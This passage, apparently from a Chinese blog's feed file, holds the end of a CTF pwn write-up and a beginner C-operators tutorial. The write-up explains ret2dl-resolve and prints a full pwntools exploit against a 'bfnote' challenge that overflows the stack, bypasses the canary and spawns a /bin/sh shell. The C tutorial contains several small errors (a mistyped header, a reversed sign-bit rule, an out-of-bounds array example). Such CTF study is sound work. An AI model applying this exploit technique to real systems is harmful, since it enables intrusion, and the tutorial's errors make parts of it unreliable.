class="comment">//(4字节),其中最低字节应该为0x7，前三个字节当做一个数字，是相对.dynsym起始的偏移的下标(即偏移还需要除以0x10)</span></span><br><span class="line">&#125; Elf32_Rel;</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    Elf64_Xword    r_offset;   <span class="comment">//是got的对应的地址(8字节)</span></span><br><span class="line">    Elf64_Xword    r_info;     <span class="comment">//(8字节),其中最低字节应该为0x7,前三个字节当做一个</span></span><br><span class="line">　　</span><br><span class="line"> Elf64_Sxword r_addend; 　　<span class="comment">//(8字节)</span></span><br><span class="line"> </span><br><span class="line">&#125; Elf64_Rel;</span><br></pre></td></tr></table></figure><p><u>一般x64选择gadget进行攻击 此题也为32位 故以下详细介绍32位使用ret2dl-resolve攻击方法</u><br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230628115713705.png" alt="image-20230628115713705"></p><p>32位延迟绑定具体流程<br>*第一个push的值实际上是对应的Rel和.dynrel的相对偏移<br> *jmp跳转到第一个第一个push偏移对应的Rel结构，取出里面的info中包含的sym结构的下标，找到对应的sym中的字符串的地址，从而解析到这个名称为该字符串的函数，将其地址写入rel第一项的地址中。此时，将栈清空到一开始push的两个值之前，从而正常执行对应的字符串的函数即可。</p><p>我们的ret2dl-resolve实际上设置为.got.plt<a href="%E4%B9%9F%E5%B0%B1%E6%98%AF%E5%9B%BE%E4%B8%AD%E7%9A%840x8048450">0</a>对应的地址即可，从而他解析完成后会继续按照给定的参数执行。<br><em>tip</em><br>中间的空白，作为gap，是因为执行的时候最后有栈地址的变化，若无gap作为阻隔，可能栈的变化会覆盖掉一些重要的数据，从而导致程序崩溃，所以需要留有一定的gap作为栈空间变化的gap</p><p>（4）漏洞利用<br>观察主函数发现一共进行了三次输入：<br>【1】修改canary、最终的返回地址及栈地址（可看汇编）<br>【2】伪造了一个shellcode<br>【3】使用TSL，绕过canary</p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230628134309027.png" alt="image-20230628134309027"></p><p>exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>, <span class="number">25009</span>)</span><br><span class="line"><span class="comment">#r = process(&quot;./bfnote&quot;)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&quot;./bfnote&quot;</span>)</span><br><span class="line"><span class="comment">#libc = ELF(&#x27;./lib/i386-linux-gnu/libc.so.6&#x27;)</span></span><br><span class="line">bss_start = <span class="number">0x0804A060</span></span><br><span class="line">gap = <span class="number">0x500</span></span><br><span class="line">stack_overflow = <span class="string">b&#x27;a&#x27;</span> * (<span class="number">0x3e</span> - <span class="number">0xc</span> + <span class="number">0x8</span>) + p64(bss_start + gap + <span class="number">0x4</span>)</span><br><span class="line"> </span><br><span class="line">r.recvuntil(<span class="string">&#x27;Give your description : &#x27;</span>)</span><br><span class="line">r.send(stack_overflow)</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">&#x27;Give your postscript : &#x27;</span>)</span><br><span class="line"></span><br><span class="line">fake_sym = p32(bss_start + gap + <span class="number">0x4</span> * <span class="number">4</span> + <span class="number">0x8</span> - <span class="number">0x80482C8</span>) + p32(<span class="number">0</span>) + p32(<span class="number">0</span>) + p32(<span class="number">0x12</span>)</span><br><span class="line">fake_rel = p32(bss_start) + p32(<span class="number">0x7</span> + <span class="built_in">int</span>((bss_start + gap + <span class="number">0x4</span> * <span class="number">4</span> + <span class="number">0x8</span> + <span class="number">0x8</span> + <span class="number">0x8</span> - <span class="number">0x080481D8</span>) / <span class="number">0x10</span>) * <span class="number">0x100</span>)</span><br><span class="line">r.send(<span class="string">b&#x27;\x00&#x27;</span> * gap + p32(<span class="number">0x08048450</span>) + p32(bss_start + gap + <span class="number">0x4</span> * <span class="number">4</span> + <span class="number">0x8</span> * <span class="number">2</span> - <span class="number">0x080483D0</span>) + p32(<span class="number">0</span>) + p32(bss_start + gap + <span class="number">0x4</span> * <span class="number">4</span>) + <span class="string">b&#x27;/bin/sh\x00&#x27;</span> + <span class="string">b&#x27;system\x00\x00&#x27;</span> + fake_rel + fake_sym)</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">&#x27;Give your notebook size : &#x27;</span>)</span><br><span class="line">r.send(<span class="built_in">str</span>(<span class="number">0x20000</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">&#x27;Give your title size : &#x27;</span>)</span><br><span class="line">r.send(<span class="built_in">str</span>(<span class="number">0xf7d22714</span> - <span class="number">0xf7d01008</span> - <span class="number">16</span>))</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">&#x27;invalid ! please re-enter :\n&#x27;</span>)</span><br><span class="line">r.send(<span class="built_in">str</span>(<span class="number">4</span>))</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">&#x27;Give your title : &#x27;</span>)</span><br><span class="line">r.send(<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">&#x27;Give your note : &#x27;</span>)</span><br><span class="line">r.send(<span class="string">b&#x27;aaaa&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>难难难 啃啃啃<br>明天又是新的一天⭐<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/QQ%E5%9B%BE%E7%89%8720230628215705.jpg"></p>]]></content>
      
      
      <categories>
          
          <category> 二进制安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> 知识碎片 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>C探索碎片——操作符</title>
      <link href="/2023/09/01/C%E6%8E%A2%E7%B4%A2%E7%A2%8E%E7%AF%87%E2%80%94%E2%80%94%E6%93%8D%E4%BD%9C%E7%AC%A6/"/>
      <url>/2023/09/01/C%E6%8E%A2%E7%B4%A2%E7%A2%8E%E7%AF%87%E2%80%94%E2%80%94%E6%93%8D%E4%BD%9C%E7%AC%A6/</url>
      
        <content type="html"><![CDATA[<p>C的探索碎片——操作符</p><p> <img src="https://img-blog.csdnimg.cn/img_convert/2f25a996e53a0589036894fc5c92a086.gif" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p><ol><li><h3 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h3></li></ol><p>算术操作符</p><p>移位操作符</p><p>位操作符</p><p>赋值操作符</p><p>单目操作符</p><p>关系操作符</p><p>逻辑操作符</p><p>条件操作符</p><p>逗号表达式</p><p>下标引用、函数调用和结构成员</p><h4 id="一-算数操作符"><a href="#一-算数操作符" class="headerlink" title="一.算数操作符"></a>一.算数操作符</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">+  -  *  /  % </span><br></pre></td></tr></table></figure><p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p><p>+、-、*此类数学中常见的算数符号我们再熟悉不过，需要注意的是&#x2F;（除），%（取余）之间的区别。</p><p>例：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio,h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> a = <span class="number">10</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>,a/<span class="number">3</span>);<span class="comment">//结果为3</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>,a%<span class="number">3</span>);<span class="comment">//结果为1</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p><p>注意：1.除%操作符之外。其他几个操作符可以作用于整数和浮点数。</p><p>2.&#x2F;操作符运算时若两个操作数中含浮点数则执行浮点数除法（%lf打印结果）；若两操作数都为整数则执行整数除法。</p><p>3.%操作符的两个操作数必须为整数。</p><h4 id="二、移位操作符"><a href="#二、移位操作符" class="headerlink" title="二、移位操作符"></a>二、移位操作符</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;&lt;  左移操作符</span><br><span class="line">&gt;&gt;  右移操作符</span><br><span class="line">注：移位操作符的操作数只能是整数。</span><br></pre></td></tr></table></figure><p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p><p><em>移位操作符移动的是二进制的位，</em>而整数在内存中以补码的形式进行存储，屏幕上又以原码显示。</p><p>补充：</p><p><strong>原码</strong>：把一个数按正负直接翻译成二进制；</p><p><strong>反码</strong>：对原码进行按位取（即0变为1，1变为0）反得到反码；</p><p><strong>补码</strong>：反码+1得补码。</p><p>对于正整数原码反码补码相同，负整数则需计算。</p><p>计算方法：原码符号位（二进制表示的最高一位，是0表示为负数，是1表示为正数）不变，其他位按位取反得到反码，+1得到补码。</p><p><img src="https://img-blog.csdnimg.cn/img_convert/577aafbe300b6819adb36ad9ca0b8713.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动">编辑</p><p>移位规则：</p><ol><li>左移操作符：左边抛弃、右边补0。</li></ol><p><img src="https://img-blog.csdnimg.cn/img_convert/7dea2e4433fabdfafcc5e51f99be91f8.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动">编辑</p><ol><li>右移操作符（由编译器决定）：</li></ol><p>逻辑移位</p><p>左边用0填充，右边丢弃。</p><p><img src="https://img-blog.csdnimg.cn/img_convert/97b52d3e735c5b8e80b4087060038946.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动">编辑</p><p>算术移位</p><p>左边用原该值的符号位填充，右边丢弃。</p><p><img src="https://img-blog.csdnimg.cn/img_convert/c94a1583fad019f42f8fafa14d6897e5.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动">编辑</p><p>警告⚠：</p><p>对于移位运算符，不要移动负数位，这个是标准未定义的。</p><h4 id="三、位操作符"><a href="#三、位操作符" class="headerlink" title="三、位操作符"></a>三、位操作符</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&amp;//按位与</span><br><span class="line">|//按位或</span><br><span class="line">^//按位异或</span><br><span class="line">注：它们的操作数必须为整数。</span><br></pre></td></tr></table></figure><p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p><p>均对二进制进行操作。</p><p>&amp;：有0为0，均1为1；</p><p>|：有 1为1，均0为0；</p><p>^：相同为0，相异为1，且保证不会栈溢出。</p><p>小tip：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">a ^ a = 0;</span><br><span class="line">0 ^ a = a;</span><br></pre></td></tr></table></figure><p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p><h4 id="四、赋值操作符"><a href="#四、赋值操作符" class="headerlink" title="四、赋值操作符"></a>四、赋值操作符</h4><p>其实就是对“&#x3D;”的运用。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">赋值操作符可以连续使用，比如：</span><br><span class="line">int a = 10;</span><br><span class="line">int x = 0;</span><br><span class="line">int y = 20;</span><br><span class="line">a = x = y+1;//连续赋值</span><br></pre></td></tr></table></figure><p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p><p><strong>复合赋值符</strong></p><p>+&#x3D;</p><p>-&#x3D;</p><p>*&#x3D;</p><p>&#x2F;&#x3D;</p><p>%&#x3D;</p><p>&gt;&gt;&#x3D;</p><p>&lt;&lt;&#x3D;</p><p>&amp;&#x3D;</p><p>|&#x3D;</p><p>^&#x3D;</p><p>可以自己进行实践探索具体功能🌸</p><h4 id="五、单目操作符"><a href="#五、单目操作符" class="headerlink" title="五、单目操作符"></a>五、单目操作符</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">! 逻辑反操作</span><br><span class="line">- 负值</span><br><span class="line">+ 正值</span><br><span class="line">&amp; 取地址</span><br><span class="line">sizeof 操作数的类型长度（以字节为单位）</span><br><span class="line">~ 对一个数的二进制按位取反</span><br><span class="line">-- 前置、后置--</span><br><span class="line">++ 前置、后置++</span><br><span class="line">* 间接访问操作符(解引用操作符)</span><br><span class="line">(类型) 强制类型转换</span><br></pre></td></tr></table></figure><p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p><h4 id="六、关系操作符"><a href="#六、关系操作符" class="headerlink" title="六、关系操作符"></a>六、关系操作符</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&gt;</span><br><span class="line">&gt;=</span><br><span class="line">&lt;</span><br><span class="line">&lt;=</span><br><span class="line">!= 用于测试“不相等”</span><br><span class="line">== 用于测试“相等”</span><br></pre></td></tr></table></figure><p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p><p>注意：编程过程中不要混淆&#x3D;&#x3D;和&#x3D;，不然会变成bug小子。</p><h4 id="七、逻辑操作符"><a href="#七、逻辑操作符" class="headerlink" title="七、逻辑操作符"></a>七、逻辑操作符</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&amp;&amp; 逻辑与</span><br><span class="line">|| 逻辑或</span><br></pre></td></tr></table></figure><p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p><p>区分<strong>逻辑与</strong>和<strong>按位与</strong></p><p>区分<strong>逻辑或</strong>和<strong>按位或</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1&amp;2-----&gt;0</span><br><span class="line">1&amp;&amp;2----&gt;1</span><br><span class="line">1|2-----&gt;3</span><br><span class="line">1||2----&gt;1</span><br></pre></td></tr></table></figure><p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p><h4 id="八、条件操作符"><a href="#八、条件操作符" class="headerlink" title="八、条件操作符"></a>八、条件操作符</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exp1 ? exp2 : exp3</span><br></pre></td></tr></table></figure><p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p><p>懒鬼懒得解释了直接上🌰</p><p>例：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#include&lt;stdio.h&gt;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    int a, b;</span><br><span class="line">    scanf(&quot;%d%d&quot;, &amp;a, &amp;b);</span><br><span class="line">    int c = (a &gt; b) ? a : b;</span><br><span class="line">    printf(&quot;%d&quot;, c);</span><br><span class="line">    return 0;</span><br><span class="line">&#125;//输入5 3 结果为5 输入3 5 结果为3</span><br></pre></td></tr></table></figure><p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p><h4 id="九、逗号表达式"><a href="#九、逗号表达式" class="headerlink" title="九、逗号表达式"></a>九、逗号表达式</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exp1, exp2, exp3, …expN</span><br></pre></td></tr></table></figure><p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p><p>逗号表达式，就是用逗号隔开的多个表达式。</p><p>逗号表达式，从左向右依次执行。整个表达式的结果是最后一个表达式的结果。</p><h4 id="十、下标引用、函数调用和结构成员"><a href="#十、下标引用、函数调用和结构成员" class="headerlink" title="十、下标引用、函数调用和结构成员"></a>十、下标引用、函数调用和结构成员</h4><p>\1. [ ] 下标引用操作符</p><p>操作数：一个数组名 + 一个索引值</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">int arr[6];//创建数组</span><br><span class="line">arr[6] = 10;//实用下标引用操作符。</span><br><span class="line">[ ]的两个操作数是arr和6</span><br></pre></td></tr></table></figure><p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p><p>\2. ( ) 函数调用操作符</p><p>接受一个或者多个操作数：第一个操作数是函数名，剩余的操作数就是传递给函数的参数。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">void</span> <span class="title function_">test1</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;hehe\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">test2</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *str)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, str);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">test1(); <span class="comment">//实用（）作为函数调用操作符。</span></span><br><span class="line">test2(<span class="string">&quot;hello bit.&quot;</span>);<span class="comment">//实用（）作为函数调用操作符。</span></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p><p>\3. 访问一个结构的成员</p><table><thead><tr><th>. - &gt;</th><th>结构体.成员名 结构体指针-&gt;成员名</th></tr></thead><tbody><tr><td></td><td></td></tr></tbody></table><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">S</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="type">int</span> num ;</span><br><span class="line">    <span class="type">char</span> c ;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">S</span> <span class="title">s</span> =</span> &#123;<span class="number">6</span>,<span class="string">&#x27;a&#x27;</span>&#125;;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, s.num);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, s.c);</span><br><span class="line">&#125;<span class="comment">//打印出6 a</span></span><br></pre></td></tr></table></figure><p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">S</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="type">int</span> num ;</span><br><span class="line">    <span class="type">char</span> c ;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">void</span> <span class="title function_">test</span><span class="params">(<span class="keyword">struct</span> S* p)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, p-&gt;num);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, p-&gt;c);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">S</span> <span class="title">s</span> =</span> &#123;<span class="number">6</span>,<span class="string">&#x27;a&#x27;</span>&#125;;</span><br><span class="line">    test(&amp;s);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;<span class="comment">//打印出6 a</span></span><br></pre></td></tr></table></figure><p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p><ol><li><h3 id="操作符属性"><a href="#操作符属性" class="headerlink" title="操作符属性"></a>操作符属性</h3></li></ol><p>*<strong>复杂表达式的求值有三个影响的因素：*</strong></p><p>\1. 操作符的优先级</p><p>\2. 操作符的结合性</p><p>\3. 是否控制求值顺序。</p><p>💫<strong>两个相邻的操作符先执行哪个？取决于他们的优先级；如果两者的优先级相同，取决于他们的结合性。</strong></p><ol><li><h3 id="操作符的优先级"><a href="#操作符的优先级" class="headerlink" title="操作符的优先级"></a>操作符的优先级</h3></li></ol><table><thead><tr><th>操作 符</th><th>描述</th><th>用法示例</th><th>结果类型</th><th>结合性</th><th>是否控制求值顺序</th></tr></thead><tbody><tr><td>（）</td><td>聚组</td><td>（表达式）</td><td>与表达 式同</td><td>N&#x2F;A（不适用）</td><td>否</td></tr><tr><td>（）</td><td>函数调用</td><td>rexp（rexp，…,rexp）</td><td>rexp</td><td>L-R（左到右）</td><td>否</td></tr><tr><td>[ ]</td><td>下标引用</td><td>rexp[rexp]</td><td>lexp</td><td>L-R</td><td>否</td></tr><tr><td>.</td><td>访问结构成员</td><td>lexp.member_name</td><td>lexp</td><td>L-R</td><td>否</td></tr><tr><td>-&gt;</td><td>访问结构指针成员</td><td>rexp-&gt;member_name</td><td>lexp</td><td>L-R</td><td>否</td></tr><tr><td>++</td><td>后缀自增</td><td>lexp ++</td><td>rexp</td><td>L-R</td><td>否</td></tr><tr><td>–</td><td>后缀自减</td><td>lexp –</td><td>rexp</td><td>L-R</td><td>否</td></tr><tr><td>!</td><td>逻辑反</td><td>! rexp</td><td>rexp</td><td>R-L（右到左）</td><td>否</td></tr><tr><td>~</td><td>按位取反</td><td>~ rexp</td><td>rexp</td><td>R-L</td><td>否</td></tr><tr><td>+</td><td>单目，表示正值</td><td>+ rexp</td><td>rexp</td><td>R-L</td><td>否</td></tr><tr><td>-</td><td>单目，表示负值</td><td>- rexp</td><td>rexp</td><td>R-L</td><td>否</td></tr><tr><td>++</td><td>前缀自增</td><td>++ lexp</td><td>rexp</td><td>R-L</td><td>否</td></tr><tr><td>–</td><td>前缀自减</td><td>– lexp</td><td>rexp</td><td>R-L</td><td>否</td></tr><tr><td>*</td><td>间接访问</td><td>* rexp</td><td>lexp</td><td>R-L</td><td>否</td></tr><tr><td>&amp;</td><td>取地址</td><td>&amp; lexp</td><td>rexp</td><td>R-L</td><td>否</td></tr><tr><td>sizeof</td><td>取其长度，以字节 表示</td><td>sizeof rexp sizeof(类 型)</td><td>rexp</td><td>R-L</td><td>否</td></tr><tr><td>(类 型）</td><td>类型转换</td><td>(类型) rexp</td><td>rexp</td><td>R-L</td><td>否</td></tr><tr><td>*</td><td>乘法</td><td>rexp * rexp</td><td>rexp</td><td>L-R</td><td>否</td></tr><tr><td>&#x2F;</td><td>除法</td><td>rexp &#x2F; rexp</td><td>rexp</td><td>L-R</td><td>否</td></tr><tr><td>%</td><td>整数取余</td><td>rexp % rexp</td><td>rexp</td><td>L-R</td><td>否</td></tr><tr><td>+</td><td>加法</td><td>rexp + rexp</td><td>rexp</td><td>L-R</td><td>否</td></tr><tr><td>-</td><td>减法</td><td>rexp - rexp</td><td>rexp</td><td>L-R</td><td>否</td></tr><tr><td>&lt;&lt;</td><td>左移位</td><td>rexp &lt;&lt; rexp</td><td>rexp</td><td>L-R</td><td>否</td></tr><tr><td>&gt;&gt;</td><td>右移位</td><td>rexp &gt;&gt; rexp</td><td>rexp</td><td>L-R</td><td>否</td></tr><tr><td>&gt;</td><td>大于</td><td>rexp &gt; rexp</td><td>rexp</td><td>L-R</td><td>否</td></tr><tr><td>&gt;&#x3D;</td><td>大于等于</td><td>rexp &gt;&#x3D; rexp</td><td>rexp</td><td>L-R</td><td>否</td></tr><tr><td>&lt;</td><td>小于</td><td>rexp &lt; rexp</td><td>rexp</td><td>L-R</td><td>否</td></tr><tr><td>&lt;&#x3D;</td><td>小于等于</td><td>rexp &lt;&#x3D; 